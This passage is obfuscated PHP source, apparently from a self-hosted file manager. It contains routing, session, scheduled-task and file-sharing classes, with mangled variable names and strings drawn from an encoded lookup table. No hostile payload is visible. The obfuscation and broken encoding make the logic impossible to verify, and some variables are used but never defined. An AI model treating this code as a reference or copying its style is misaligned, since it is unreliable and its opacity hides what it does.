$È¦ê‰Ä®) || $›øÜŒ‚ && $ÀÎ·Æï != REPEAT_RENAME_FOLDER) { return $Áè·í; } if ($ÀÎ·Æï == REPEAT_SKIP) { return !1; } $ ïÅßêÁ = $±á‘çŒ[10] . get_path_ext($Áè·í); $ ïÅßêÁ = $ ïÅßêÁ == $±á‘çŒ[10] || $›øÜŒ‚ ? $±á‘çŒ[12] : $ ïÅßêÁ; for ($ºÄ„ù›ú = 1; $ºÄ„ù›ú <= count($È¦ê‰Ä®) + 1; $ºÄ„ù›ú++) { $ïÄ¾ë’à = substr($Áè·í, 0, strlen($Áè·í) - strlen($ ïÅßêÁ)); $À™ºê¨Æ = $ïÄ¾ë’à . "\50{$ºÄ„ù›ú}\51{$ ïÅßêÁ}"; if (!in_array_not_case($À™ºê¨Æ, $È¦ê‰Ä®)) { return $À™ºê¨Æ; } } } } goto a®¸ŠÅÍ“; FÑ‹¾Å³ô­: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Û•çìÄœ) { parent::__construct($Û•çìÄœ); $this->setSignVersion($_SERVER[ç¦¬”œš][247]); } public function fileOutLink($–¸³í«ı) { $˜Œ€Ÿ½” =& $_SERVER[ç¦¬”œš]; if (substr($–¸³í«ı, 0, 7) == $˜Œ€Ÿ½”[313]) { $–¸³í«ı = $˜Œ€Ÿ½”[314] . substr($–¸³í«ı, 7); } header($˜Œ€Ÿ½”[175] . $–¸³í«ı); die; } } $_file = $_SERVER[$_SERVER[ç¦¬”œš][472]]; $_size = $_SERVER[ç¦¬”œš][473]; goto DÎ‰‡ãª¨Œ; cÅ ¢¶Í¦Ê: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\x5e\57\x5d\x2b", "\x3a\156\165\x6d" => "\133\60\55\x39\x5d\53", "\72\x61\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($§šƒÅÈ, $ç²’œõØ) { $é‡£·‘ï =& $_SERVER[ç¦¬”œš]; if ($§šƒÅÈ == $é‡£·‘ï[1706]) { $Éˆ„ÕÛ = array_map($é‡£·‘ï[1707], $ç²’œõØ[0]); $ö°ºÜÍ¾ = strpos($ç²’œõØ[1], $é‡£·‘ï[8]) === 0 ? $ç²’œõØ[1] : $é‡£·‘ï[8] . $ç²’œõØ[1]; $¨ü‹–Û“ = $ç²’œõØ[2]; } else { $Éˆ„ÕÛ = null; $ö°ºÜÍ¾ = strpos($ç²’œõØ[0], $é‡£·‘ï[8]) === 0 ? $ç²’œõØ[0] : $é‡£·‘ï[8] . $ç²’œõØ[0]; $¨ü‹–Û“ = $ç²’œõØ[1]; } array_push(self::$maps, $Éˆ„ÕÛ); array_push(self::$routes, $ö°ºÜÍ¾); array_push(self::$methods, strtoupper($§šƒÅÈ)); array_push(self::$callbacks, $¨ü‹–Û“); } public static function error($¯àï³¾Â) { self::$errorCallback = $¯àï³¾Â; } public static function haltOnMatch($°†Ù”ª  = true) { self::$halts = $°†Ù”ª ; } public static function dispatch() { $ƒŸªÚ†‡ =& $_SERVER[ç¦¬”œš]; $ôí€À—æ = parse_url($_SERVER[$ƒŸªÚ†‡[1708]], PHP_URL_PATH); $…—Ì£© = $_SERVER[$ƒŸªÚ†‡[164]]; $£åŸç³ = array_keys(static::$patterns); $¸ÒË§½ = array_values(static::$patterns); $´âÃÒÍä = !1; self::$routes = preg_replace($ƒŸªÚ†‡[1362], $ƒŸªÚ†‡[8], self::$routes); if (in_array($ôí€À—æ, self::$routes)) { $áŒ—ã»À = array_keys(self::$routes, $ôí€À—æ); foreach ($áŒ—ã»À as $Í£—ßşû) { if (self::$methods[$Í£—ßşû] == $…—Ì£© || self::$methods[$Í£—ßşû] == $ƒŸªÚ†‡[1709] || in_array($…—Ì£©, self::$maps[$Í£—ßşû])) { $´âÃÒÍä = !0; if (!is_object(self::$callbacks[$Í£—ßşû])) { $Ş©Î±÷´ = explode($ƒŸªÚ†‡[8], self::$callbacks[$Í£—ßşû]); $‘¨òÈ = end($Ş©Î±÷´); $üÙ¼½†¸ = explode($ƒŸªÚ†‡[1294], $‘¨òÈ); $ˆÈÄÕå = new $üÙ¼½†¸[0](); $ˆÈÄÕå->{$üÙ¼½†¸[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Í£—ßşû]); if (self::$halts) { return; } } } } } else { $¶€‡Ğ£Ö = 0; foreach (self::$routes as $Í£—ßşû) { if (strpos($Í£—ßşû, $ƒŸªÚ†‡[4]) !== !1) { $Í£—ßşû = str_replace($£åŸç³, $¸ÒË§½, $Í£—ßşû); } if (preg_match($ƒŸªÚ†‡[1710] . $Í£—ßşû . $ƒŸªÚ†‡[1711], $ôí€À—æ, $¢öŒ±±¸)) { if (self::$methods[$¶€‡Ğ£Ö] == $…—Ì£© || self::$methods[$¶€‡Ğ£Ö] == $ƒŸªÚ†‡[1709] || !empty(self::$maps[$¶€‡Ğ£Ö]) && in_array($…—Ì£©, self::$maps[$¶€‡Ğ£Ö])) { $´âÃÒÍä = !0; array_shift($¢öŒ±±¸); if (!is_object(self::$callbacks[$¶€‡Ğ£Ö])) { $Ş©Î±÷´ = explode($ƒŸªÚ†‡[8], self::$callbacks[$¶€‡Ğ£Ö]); $‘¨òÈ = end($Ş©Î±÷´); $üÙ¼½†¸ = explode($ƒŸªÚ†‡[1294], $‘¨òÈ); $ˆÈÄÕå = new $üÙ¼½†¸[0](); if (!method_exists($ˆÈÄÕå, $üÙ¼½†¸[1])) { echo $ƒŸªÚ†‡[1712]; } else { call_user_func_array(array($ˆÈÄÕå, $üÙ¼½†¸[1]), $¢öŒ±±¸); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¶€‡Ğ£Ö], $¢öŒ±±¸); if (self::$halts) { return; } } } } $¶€‡Ğ£Ö++; } } if ($´âÃÒÍä == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $–øì¨ÂÃ =& $_SERVER[ç¦¬”œš]; header($_SERVER[$–øì¨ÂÃ[1713]] . $–øì¨ÂÃ[1714]); echo $–øì¨ÂÃ[1715]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ƒŸªÚ†‡[1708]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ó”Ï“š÷ =& $_SERVER[ç¦¬”œš]; static $‹ššÁ€½ = false; if ($‹ššÁ€½) { return $‹ššÁ€½; } $¿Ï´áù = $GLOBALS[$ó”Ï“š÷[6]][$ó”Ï“š÷[425]]; self::$sessionTime = $¿Ï´áù[$ó”Ï“š÷[1716]]; $¿Ê’µ®â = isset($GLOBALS[$ó”Ï“š÷[1717]]) ? $GLOBALS[$ó”Ï“š÷[1717]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¿Ê’µ®â)) { self::$sessionSign = Cookie::get($¿Ê’µ®â); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($¿Ê’µ®â, self::$sessionSign, self::$sessionTime); $Â¥í¸ü½ = $¿Ï´áù[$ó”Ï“š÷[1718]]; $øµÍ‰§ = $¿Ï´áù[$Â¥í¸ü½]; $Ë÷®åß÷ = $¿Ï´áù[$ó”Ï“š÷[907]]; switch ($Â¥í¸ü½) { case $ó”Ï“š÷[21]: self::$handle = Model($ó”Ï“š÷[908]); break; case $ó”Ï“š÷[909]: self::$handle = new CacheRedis($øµÍ‰§, $Ë÷®åß÷); break; case $ó”Ï“š÷[910]: self::$handle = new CacheMemcached($øµÍ‰§, $Ë÷®åß÷); break; case $ó”Ï“š÷[230]: $øµÍ‰§[$ó”Ï“š÷[87]] = $øµÍ‰§[$ó”Ï“š÷[87]] . $ó”Ï“š÷[1719]; self::$handle = new CacheFile($øµÍ‰§, $Ë÷®åß÷); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $‹ššÁ€½ = new self(); return $‹ššÁ€½; } public static function getBySign($®Á‘Äò) { $µ…×¿°× = self::$handle->get($®Á‘Äò); $µ…×¿°× = unserialize($µ…×¿°×); return is_array($µ…×¿°×) ? $µ…×¿°× : array(); } public static function setBySign($Âê¶şÒ•, $å±Ç÷É) { CacheLock::lock($Âê¶şÒ•); self::$handle->set($Âê¶şÒ•, serialize($å±Ç÷É), self::$sessionTime); CacheLock::unlock($Âê¶şÒ•); } public static function sign($°šµ®­à = false) { if ($°šµ®­à) { self::$sessionSign = $°šµ®­à; } self::init(); return self::$sessionSign; } public static function set($µŞ«•ôÚ, $Ô„ÉšŸ = false) { self::init(); if (is_array($µŞ«•ôÚ)) { foreach ($µŞ«•ôÚ as $ÈâËËá‡ => $ÇíøÓ‘ï) { array_set_value(self::$data, $ÈâËËá‡, $ÇíøÓ‘ï); } } else { array_set_value(self::$data, $µŞ«•ôÚ, $Ô„ÉšŸ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($íòİ¢ûï = false) { self::init(); if (!$íòİ¢ûï) { return self::$data; } return array_get_value(self::$data, $íòİ¢ûï); } public static function remove($ÔÔÕ–ª´) { self::init(); unset(self::$data[$ÔÔÕ–ª´]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ç¦¬”œš][913])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $òæŠõÑ¯ =& $_SERVER[ç¦¬”œš]; if (self::valueGet($òæŠõÑ¯[830]) != $òæŠõÑ¯[91]) { return; } if (self::valueGet($òæŠõÑ¯[1720]) == $òæŠõÑ¯[91]) { $ÙÓ®§À§ = self::valueGet($òæŠõÑ¯[1721]); if (time() - $ÙÓ®§À§ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($òæŠõÑ¯[1720], $òæŠõÑ¯[91]); self::log($òæŠõÑ¯[1722] . ACTION . $òæŠõÑ¯[1723]); Hook::bind($òæŠõÑ¯[1724], $òæŠõÑ¯[1725]); $ìÓëöµ¨ = 0; while (!0) { self::cacheClear(); if (self::valueGet($òæŠõÑ¯[830]) != $òæŠõÑ¯[91]) { self::valueSet($òæŠõÑ¯[1720], $òæŠõÑ¯[228]); self::log($òæŠõÑ¯[1726]); die; } $Í¹ƒ“º¬ = time(); if ($Í¹ƒ“º¬ - $ìÓëöµ¨ >= 60) { self::valueSet(array($òæŠõÑ¯[1720] => $òæŠõÑ¯[91], $òæŠõÑ¯[1721] => $Í¹ƒ“º¬)); $ìÓëöµ¨ = $Í¹ƒ“º¬; } if (!file_exists(USER_SYSTEM . $òæŠõÑ¯[1727])) { self::valueSet(array($òæŠõÑ¯[1720] => $òæŠõÑ¯[228], $òæŠõÑ¯[830] => $òæŠõÑ¯[228])); self::log($òæŠõÑ¯[1728]); die; } $‰™âê…û = file_get_contents(BASIC_PATH . $òæŠõÑ¯[1729]); $ŒàÑü£é = KOD_VERSION . $òæŠõÑ¯[10] . KOD_VERSION_BUILD; $ğÈ‹À»„ = match_text($‰™âê…û, $òæŠõÑ¯[1730]) . $òæŠõÑ¯[10] . match_text($‰™âê…û, $òæŠõÑ¯[1731]); if ($ğÈ‹À»„ != $ŒàÑü£é) { self::restart(); self::log("\x73\x74\157\160\x65\144\56\133\x76\x65\162\163\151\157\156\x20\x75\160\x64\x61\x74\145\x3b{$versionNow}\40\75\76\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Îòşş€Ë =& $_SERVER[ç¦¬”œš]; http_close(); $GLOBALS[$Îòşş€Ë[1732]] = 1; $_SERVER[$Îòşş€Ë[1733]] = $Îòşş€Ë[1734]; $_COOKIE = array(); $GLOBALS[$Îòşş€Ë[1735]] = 1; $GLOBALS[$Îòşş€Ë[1736]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $êÛ¸–¦‹ =& $_SERVER[ç¦¬”œš]; http_close(); self::valueSet($êÛ¸–¦‹[830], $êÛ¸–¦‹[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($êÛ¸–¦‹[1720] => $êÛ¸–¦‹[228], $êÛ¸–¦‹[830] => $êÛ¸–¦‹[91])); self::log($êÛ¸–¦‹[1737]); } public static function taskSwitch() { $‡ô…˜Çß =& $_SERVER[ç¦¬”œš]; $¸ÔÓ»¤™ = self::valueGet($‡ô…˜Çß[830]) == $‡ô…˜Çß[91] ? $‡ô…˜Çß[228] : $‡ô…˜Çß[91]; self::valueSet($‡ô…˜Çß[830], $¸ÔÓ»¤™); } public static function shutdownEvent() { $¢¶ÑÒœ =& $_SERVER[ç¦¬”œš]; self::valueSet($¢¶ÑÒœ[1720], $¢¶ÑÒœ[228]); self::log($¢¶ÑÒœ[1738]); } public static function config($¥Èåäî¦, $Ê»ãº©Ğ) { self::valueSet($_SERVER[ç¦¬”œš][830], $¥Èåäî¦); } private static function taskRunAll() { $ÀğÚ…Õà =& $_SERVER[ç¦¬”œš]; $Ü„Åß”„ = timeFloat(); $±á±Ÿˆ’ = Model($ÀğÚ…Õà[1739])->listData(); $»¡Ï«•‘ = count($±á±Ÿˆ’); for ($“ª‘¨ŸŸ = 0; $“ª‘¨ŸŸ < $»¡Ï«•‘; $“ª‘¨ŸŸ++) { $ ¨ˆ×ğÊ = $±á±Ÿˆ’[$“ª‘¨ŸŸ]; if (!$ ¨ˆ×ğÊ[$ÀğÚ…Õà[484]] || $ ¨ˆ×ğÊ[$ÀğÚ…Õà[1740]] != $ÀğÚ…Õà[91]) { continue; } if (!self::taskTimeCheck($ ¨ˆ×ğÊ)) { continue; } self::taskRun($ ¨ˆ×ğÊ); } Hook::trigger($ÀğÚ…Õà[1741]); self::taskQueueRun($Ü„Åß”„); } private static function taskQueueRun($Í ÍÇ‹ì) { $¦¼óÜ­ú = 10; while (!0) { $ó—ƒÕÜ” = TaskQueue::run(); if ($ó—ƒÕÜ” === !1) { break; } if (timeFloat() - $Í ÍÇ‹ì >= $¦¼óÜ­ú) { break; } } } private static function taskTimeCheck($‚Äö³ªì) { $áëÃ¿¹Ê =& $_SERVER[ç¦¬”œš]; $ÂâÁÌ™Ğ = json_decode($‚Äö³ªì[$áëÃ¿¹Ê[206]], !0); $êªı¡’® = intval($‚Äö³ªì[$áëÃ¿¹Ê[1721]]); $ÀÔ­–œÃ = strtotime($áëÃ¿¹Ê[1742] . $ÂâÁÌ™Ğ[$áëÃ¿¹Ê[1743]] . $áëÃ¿¹Ê[1744]) - strtotime($áëÃ¿¹Ê[1745]); $™‹÷ÂÁ = time() - strtotime(date($áëÃ¿¹Ê[1746]) . $áëÃ¿¹Ê[1747]); $µ™ÓØäµ = $™‹÷ÂÁ >= $ÀÔ­–œÃ && $™‹÷ÂÁ <= $ÀÔ­–œÃ + 3600; switch ($ÂâÁÌ™Ğ[$áëÃ¿¹Ê[33]]) { case $áëÃ¿¹Ê[1748]: if (time() - $êªı¡’® < 3600 * 24 * 30) { return !1; } if ($ÂâÁÌ™Ğ[$áëÃ¿¹Ê[1748]] == date($áëÃ¿¹Ê[1749]) && $µ™ÓØäµ) { return !0; } break; case $áëÃ¿¹Ê[1750]: if (time() - $êªı¡’® < 3600 * 24 * 7) { return !1; } $·‡ŠéØ = date($áëÃ¿¹Ê[1751]) == 0 ? 7 : date($áëÃ¿¹Ê[1751]); if ($ÂâÁÌ™Ğ[$áëÃ¿¹Ê[1750]] == $·‡ŠéØ && $µ™ÓØäµ) { return !0; } break; case $áëÃ¿¹Ê[1743]: if (time() - $êªı¡’® < 3600 * 24) { return !1; } if ($µ™ÓØäµ) { return !0; } break; case $áëÃ¿¹Ê[1752]: if (time() - $êªı¡’® >= floatval($ÂâÁÌ™Ğ[$áëÃ¿¹Ê[1752]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $­‚£„Şä =& $_SERVER[ç¦¬”œš]; static $â¬É÷± = 0; $ûÓš•ÓŒ = 300; if (!$â¬É÷±) { $â¬É÷± = time(); } if (time() - $â¬É÷± < $ûÓš•ÓŒ) { return; } $â¬É÷± = time(); $Éíô«¼ = Model($­‚£„Şä[586])->db($­‚£„Şä[12]); if ($Éíô«¼) { $Éíô«¼->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($­‚£„Şä[1753], $­‚£„Şä[1754]); die; } } public static function taskRun($İÀñæó«) { $¯ˆœÆ·ğ =& $_SERVER[ç¦¬”œš]; self::log($¯ˆœÆ·ğ[1755] . $İÀñæó«[$¯ˆœÆ·ğ[484]] . $¯ˆœÆ·ğ[1756] . $İÀñæó«[$¯ˆœÆ·ğ[32]] . $¯ˆœÆ·ğ[1757] . $İÀñæó«[$¯ˆœÆ·ğ[1758]]); Model($¯ˆœÆ·ğ[1739])->run($İÀñæó«[$¯ˆœÆ·ğ[484]]); $÷èíÈ†è = timeFloat(); $ªÉµßõõ = $¯ˆœÆ·ğ[12]; switch ($İÀñæó«[$¯ˆœÆ·ğ[33]]) { case $¯ˆœÆ·ğ[383]: $ÙŠÊßúâ = url_request($İÀñæó«[$¯ˆœÆ·ğ[1758]], $¯ˆœÆ·ğ[261], !1, !1, !1, !1, 10); if ($ÙŠÊßúâ[$¯ˆœÆ·ğ[830]]) { $ªÉµßõõ = strlen($ÙŠÊßúâ[$¯ˆœÆ·ğ[1288]]); } break; case $¯ˆœÆ·ğ[260]: $ªÉµßõõ = Hook::apply($İÀñæó«[$¯ˆœÆ·ğ[1758]]); default: break; } Model($¯ˆœÆ·ğ[1759])->add(array($¯ˆœÆ·ğ[1760] => $¯ˆœÆ·ğ[12], $¯ˆœÆ·ğ[1761] => $¯ˆœÆ·ğ[228], $¯ˆœÆ·ğ[33] => $¯ˆœÆ·ğ[1762] . $İÀñæó«[$¯ˆœÆ·ğ[484]], $¯ˆœÆ·ğ[1763] => json_encode(array($¯ˆœÆ·ğ[32] => $İÀñæó«[$¯ˆœÆ·ğ[32]], $¯ˆœÆ·ğ[1764] => timeFloat() - $÷èíÈ†è, $¯ˆœÆ·ğ[369] => $ªÉµßõõ)))); $Ò’îëë± = $ªÉµßõõ ? $¯ˆœÆ·ğ[1765] . $ªÉµßõõ : $¯ˆœÆ·ğ[12]; self::log($¯ˆœÆ·ğ[1766] . $İÀñæó«[$¯ˆœÆ·ğ[484]] . $¯ˆœÆ·ğ[178] . $Ò’îëë±); return !0; } public static function valueGet($œËåÚÃ„) { $ÙÌ‚ŞáØ =& $_SERVER[ç¦¬”œš]; $°Ù²ó¯¥ = $ÙÌ‚ŞáØ[1767]; $£ÊËıÄ¯ = Model($ÙÌ‚ŞáØ[517])->get($œËåÚÃ„, $°Ù²ó¯¥); if (is_null($£ÊËıÄ¯)) { Model($ÙÌ‚ŞáØ[517])->set($ÙÌ‚ŞáØ[830], $ÙÌ‚ŞáØ[91], $°Ù²ó¯¥); Model($ÙÌ‚ŞáØ[517])->set($ÙÌ‚ŞáØ[1720], $ÙÌ‚ŞáØ[228], $°Ù²ó¯¥); $£ÊËıÄ¯ = Model($ÙÌ‚ŞáØ[517])->get($œËåÚÃ„, $°Ù²ó¯¥); } return $£ÊËıÄ¯; } private static function valueSet($ÚöÅ¬í­, $Ğ¾Ä×…° = false) { $Œ¹º«ø =& $_SERVER[ç¦¬”œš]; $Üß±½â† = $Œ¹º«ø[1768]; CacheLock::lock($Üß±½â†); $İ¾Ãµçµ = Model($Œ¹º«ø[517])->set($ÚöÅ¬í­, $Ğ¾Ä×…°, $Œ¹º«ø[1767]); CacheLock::unlock($Üß±½â†); return $İ¾Ãµçµ; } protected static function log($ïÒ±ø) { write_log($ïÒ±ø, $_SERVER[ç¦¬”œš][1754]); } private static function cacheClear() { $Ø°°ÑÅğ =& $_SERVER[ç¦¬”œš]; Cache::clearMemory(Model($Ø°°ÑÅğ[517])->cacheKey($Ø°°ÑÅğ[1767])); Cache::clearMemory(Model($Ø°°ÑÅğ[517])->cacheKey($Ø°°ÑÅğ[1769])); Model($Ø°°ÑÅğ[1739])->cacheClear(); self::closeDatabase(); } } goto e­Ò§£Æ; bÈÇ´ë÷ó»: class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\145"; protected $dataAuto = array(array("\155\157\x64\151\146\x79\124\151\155\145", "\x74\x69\155\145", "\151\x6e\163\x65\162\x74\54\x75\160\x64\141\x74\x65", "\x66\165\156\x63\164\151\157\x6e"), array("\x63\162\x65\x61\164\x65\x54\x69\155\x65", "\164\151\x6d\x65", "\x69\x6e\x73\145\162\x74", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\x6f\x70\x74\x69\157\x6e\163", '', "\151\156\163\145\x72\x74\x2c\165\x70\x64\x61\164\145\x2c\163\145\x6c\145\143\x74", "\152\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($é¬­Ÿà”) { $çèäıŞú =& $_SERVER[ç¦¬”œš]; $Ìç¬áœ = isset($é¬­Ÿà”[0]) ? $é¬­Ÿà”[0] : !1; return array($çèäıŞú[2112] => array(USER_ID, $çèäıŞú[2113]), $çèäıŞú[2053] => array($Ìç¬áœ, $çèäıŞú[2114])); } protected function listSimple() { $§Àì³ÇÏ = array($_SERVER[ç¦¬”œš][1770] => USER_ID); $Åã éˆ« = $this->field($this->fieldList)->where($§Àì³ÇÏ)->select(); return $Åã éˆ« ? $Åã éˆ« : array(); } protected function getInfo($ü¨Š×â, $ó±ºÜşŸ = false) { $òç´†ÕØ =& $_SERVER[ç¦¬”œš]; if ($ó±ºÜşŸ) { return $this->_getShareInfo(array($òç´†ÕØ[674] => $ü¨Š×â)); } $‹Úæ–Ò = $this->cacheFunctionGet($òç´†ÕØ[2055], $ü¨Š×â); return $‹Úæ–Ò; } public function getInfoByHash($î¼Êğâµ) { return $this->_getShareInfo(array($_SERVER[ç¦¬”œš][2115] => $î¼Êğâµ)); } public function getInfoByPath($ü€¨¯ñ“) { $Ì±Áô¸ä =& $_SERVER[ç¦¬”œš]; $–€£¨¯Â = array($Ì±Áô¸ä[1770] => USER_ID, $Ì±Áô¸ä[193] => $ü€¨¯ñ“); return $this->_getShareInfo($–€£¨¯Â); } public function getInfoBySourcePath($Ÿ°’–Šô) { $ûû²É“ =& $_SERVER[ç¦¬”œš]; $‚â®Ï´¥ = array($ûû²É“[1770] => USER_ID, $ûû²É“[1258] => $Ÿ°’–Šô); return $this->_getShareInfo($‚â®Ï´¥); } private function _getShareInfo($İşéºİ) { $©Œ«…§„ =& $_SERVER[ç¦¬”œš]; $”†ÓÕ´ƒ = $this->where($İşéºİ)->find(); if (!$”†ÓÕ´ƒ) { return !1; } $İşéºİ = array($©Œ«…§„[674] => $”†ÓÕ´ƒ[$©Œ«…§„[674]]); $¦×›¨˜° = $©Œ«…§„[2116]; $ë†ùàû = Model($©Œ«…§„[675])->order($©Œ«…§„[484])->field($¦×›¨˜°)->where($İşéºİ)->select(); if ($”†ÓÕ´ƒ[$©Œ«…§„[193]] == $©Œ«…§„[228]) { $”†ÓÕ´ƒ[$©Œ«…§„[90]] = IO::info($”†ÓÕ´ƒ[$©Œ«…§„[1258]]); } else { $”†ÓÕ´ƒ[$©Œ«…§„[90]] = Model($©Œ«…§„[1419])->pathInfo($”†ÓÕ´ƒ[$©Œ«…§„[193]]); } $”†ÓÕ´ƒ[$©Œ«…§„[2117]] = $ë†ùàû; return $”†ÓÕ´ƒ; } protected function getInfoAuth($äâè¾ô) { $ñ¤ÇØ‡ =& $_SERVER[ç¦¬”œš]; $×€Ò¿¥î = $this->getInfo($äâè¾ô); if ($×€Ò¿¥î[$ñ¤ÇØ‡[1770]] == USER_ID) { $×€Ò¿¥î[$ñ¤ÇØ‡[496]] = $×€Ò¿¥î[$ñ¤ÇØ‡[90]][$ñ¤ÇØ‡[496]]; } else { $×€Ò¿¥î[$ñ¤ÇØ‡[496]] = Model($ñ¤ÇØ‡[576])->authMake($×€Ò¿¥î[$ñ¤ÇØ‡[2117]]); } return $×€Ò¿¥î; } protected function listData($—´’€¨Š = null, $£Å‘É¦ = 300) { $á‚ÛÌ© =& $_SERVER[ç¦¬”œš]; $¸èÂ’ç = array(array($á‚ÛÌ©[571] => array($á‚ÛÌ©[1091], 0), $á‚ÛÌ©[672] => array($á‚ÛÌ©[1091], 0), $á‚ÛÌ©[2118] => $á‚ÛÌ©[2071])); if ($—´’€¨Š == $á‚ÛÌ©[2119]) { $¸èÂ’ç = array($á‚ÛÌ©[571] => 1); } else { if ($—´’€¨Š == $á‚ÛÌ©[1243]) { $¸èÂ’ç = array($á‚ÛÌ©[672] => 1); } } $¸èÂ’ç[$á‚ÛÌ©[1770]] = USER_ID; $‚ÃİÙºâ = $this->where($¸èÂ’ç)->selectPage($£Å‘É¦); return $‚ÃİÙºâ; } protected function listToMe($ğ©®óˆ… = 300) { $­ò÷‘å =& $_SERVER[ç¦¬”œš]; $Âšµ„Óñ = Model($­ò÷‘å[2120])->userGroupParents(USER_ID); $ÊÏ”’üÁ = array($­ò÷‘å[657] => SourceModel::TYPE_USER, $­ò÷‘å[578] => USER_ID); if ($Âšµ„Óñ) { $ÊÏ”’üÁ = array(array($­ò÷‘å[657] => SourceModel::TYPE_USER, $­ò÷‘å[578] => USER_ID), array($­ò÷‘å[657] => SourceModel::TYPE_GROUP, $­ò÷‘å[578] => array($­ò÷‘å[7], $Âšµ„Óñ)), $­ò÷‘å[2118] => $­ò÷‘å[2071]); } $¸–Œ¹Ê’ = Model($­ò÷‘å[675])->where($ÊÏ”’üÁ)->selectPage($ğ©®óˆ…); $³Œõ¤ËÀ = array_to_keyvalue_group($¸–Œ¹Ê’[$­ò÷‘å[445]], $­ò÷‘å[674]); if (!$³Œõ¤ËÀ) { return $¸–Œ¹Ê’; } $«ù•¤ÛÆ = $­ò÷‘å[2121]; $ÊÏ”’üÁ = array($­ò÷‘å[674] => array($­ò÷‘å[501], array_keys($³Œõ¤ËÀ)), $­ò÷‘å[1770] => array($­ò÷‘å[1093], $­ò÷‘å[228])); $¤¹öú‘ = $this->field($«ù•¤ÛÆ)->where($ÊÏ”’üÁ)->select(); foreach ($¤¹öú‘ as $—û©•õ => &$õ÷áôÊ) { $õ÷áôÊ[$­ò÷‘å[2117]] = $³Œõ¤ËÀ[$õ÷áôÊ[$­ò÷‘å[674]]]; } unset($õ÷áôÊ); $¥âş€× = array($­ò÷‘å[2122] => $¤¹öú‘, $­ò÷‘å[2123] => $¸–Œ¹Ê’[$­ò÷‘å[442]]); return $¥âş€×; } protected function shareAdd($‘æ¬ìÜÏ, $è™˜çŸ´) { $Ç¼…´êß =& $_SERVER[ç¦¬”œš]; $ŠåÉÅŠ¯ = $this->_addShareData($‘æ¬ìÜÏ, $è™˜çŸ´); if (!empty($è™˜çŸ´[$Ç¼…´êß[2124]])) { $this->_shareAuthSet($ŠåÉÅŠ¯, $è™˜çŸ´[$Ç¼…´êß[2124]]); } $this->shareEventAdd($‘æ¬ìÜÏ, $è™˜çŸ´, $Ç¼…´êß[2125]); return $ŠåÉÅŠ¯; } protected function shareAddSystem($œõïº–á, $ß¡à¤¶Ö) { $Ìô¢•Ã =& $_SERVER[ç¦¬”œš]; $û×øµÆÑ = $this->_addShareData($œõïº–á, $ß¡à¤¶Ö, $Ìô¢•Ã[191]); $this->_shareAuthSet($û×øµÆÑ, $ß¡à¤¶Ö[$Ìô¢•Ã[2124]]); return $û×øµÆÑ; } private function shareEventAdd($¬ª»¬£©, $ãğ——Ú, $•øıæ»§ = "\141\144\144") { $Ë’•áÛÍ =& $_SERVER[ç¦¬”œš]; if (!$¬ª»¬£© || $¬ª»¬£© == $Ë’•áÛÍ[228]) { return; } if ($•øıæ»§ == $Ë’•áÛÍ[2125]) { if ($ãğ——Ú[$Ë’•áÛÍ[571]] == $Ë’•áÛÍ[91]) { Model($Ë’•áÛÍ[642])->eventShare($¬ª»¬£©, $Ë’•áÛÍ[2126]); } if ($ãğ——Ú[$Ë’•áÛÍ[672]] == $Ë’•áÛÍ[91]) { Model($Ë’•áÛÍ[642])->eventShare($¬ª»¬£©, $Ë’•áÛÍ[2127]); } return; } $ôå¾Õ¥Ô = $this->getInfoByPath($¬ª»¬£©); $àãÕøøß = $Ë’•áÛÍ[2128]; if ($ôå¾Õ¥Ô[$Ë’•áÛÍ[571]] == $Ë’•áÛÍ[228] && $ãğ——Ú[$Ë’•áÛÍ[571]] == $Ë’•áÛÍ[91]) { $àãÕøøß = $Ë’•áÛÍ[2126]; } if ($ôå¾Õ¥Ô[$Ë’•áÛÍ[571]] == $Ë’•áÛÍ[91] && $ãğ——Ú[$Ë’•áÛÍ[571]] == $Ë’•áÛÍ[228]) { $àãÕøøß = $Ë’•áÛÍ[2129]; } if ($ôå¾Õ¥Ô[$Ë’•áÛÍ[672]] == $Ë’•áÛÍ[228] && $ãğ——Ú[$Ë’•áÛÍ[672]] == $Ë’•áÛÍ[91]) { $àãÕøøß = $Ë’•áÛÍ[2127]; } if ($ôå¾Õ¥Ô[$Ë’•áÛÍ[672]] == $Ë’•áÛÍ[91] && $ãğ——Ú[$Ë’•áÛÍ[672]] == $Ë’•áÛÍ[228]) { $àãÕøøß = $Ë’•áÛÍ[2130]; } Model($Ë’•áÛÍ[642])->eventShare($¬ª»¬£©, $àãÕøøß); return; } private function _addShareData($«¸½ñ¶Ğ, $¿½â˜Á = array(), $‹Ôº•ö½ = false) { $¿ò‰²á’ =& $_SERVER[ç¦¬”œš]; $™…çÍÛŠ = $‹Ôº•ö½ == 